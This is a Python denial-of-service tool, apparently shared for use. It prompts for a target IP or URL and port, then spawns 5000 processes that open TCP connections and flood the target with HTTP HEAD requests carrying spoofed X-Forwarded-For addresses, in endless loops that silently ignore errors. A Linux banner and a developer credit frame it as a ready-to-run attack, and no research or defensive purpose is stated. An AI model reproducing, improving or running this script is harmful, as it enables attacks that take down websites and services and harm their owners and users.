# scr Ddos Layer7
#555555 kuy
import socket
import os
from time import sleep
import multiprocessing
import random
import platform
#Script Linux & Termux
os.system('clear')
print("\033[1;32;40m Detecting System...")
sleep(5)
sysOS = platform.system()
print("\033[1;32;40m System detected: ", sysOS)
sleep(5)
if sysOS == "Linux":
  try:
    os.system("ulimit -n 1030000")
  except Exception as e:
    print(e)
    print("[!] Could not start the script [ERROR]")
else:
  print("[!] Can't start, you're not using Linux [ERROR]")


def randomip():
  randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
  return randip


def attack():
  connection = "Connection: null\r\n"
  referer = "Referer: null\r\n"
  forward = "X-Forwarded-For: " + randomip() + "\r\n"
  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
  request = get_host + referer  + connection + forward + "\r\n\r\n"
  while True:
    try:
      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      atk.connect((ip, port))
      #Start Attack
      for y in range(80):
          atk.send(str.encode(request))
    except socket.error:
      sleep(0)
    except:
      pass
os.system('clear')
print("""
██████╗ ██████╗  ██████╗ ███████╗    ██╗   ██╗███████╗
██╔══██╗██╔══██╗██╔═══██╗██╔════╝    ██║   ██║██╔════╝
██║  ██║██║  ██║██║   ██║███████╗    ██║   ██║███████╗
██║  ██║██║  ██║██║   ██║╚════██║    ╚██╗ ██╔╝╚════██║
██████╔╝██████╔╝╚██████╔╝███████║     ╚████╔╝ ███████║
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝      ╚═══╝  ╚══════╝
""")
sleep(5)
print("        --------DDOS [-] PYTHON--------")
sleep(3)
print("            [+] DDOS Layer7 V5.0 [+]")
sleep(3)   
print("         DEV BY : Jonathan Jackson#9999")
sleep(3)
print("\n[+]---------------START----------------[+]")
print("[>] Welcome To DDoS Layer7 ")
print("[>] hope you enjoy it \n")
ip = input("[>] IP/URL: ")
port = int(input("[>] Port: "))
url = f"http://{str(ip)}"
print("[\]----------START ATTACK---------[\]")
print("[>] Attack Started  [<]")
sleep(1)

def send2attack():
  for i in range(5000): # EZ ;)
    mp = multiprocessing.Process(target=attack)
    mp.setDaemon = False
    mp.start() #่Start !!

    
send2attack()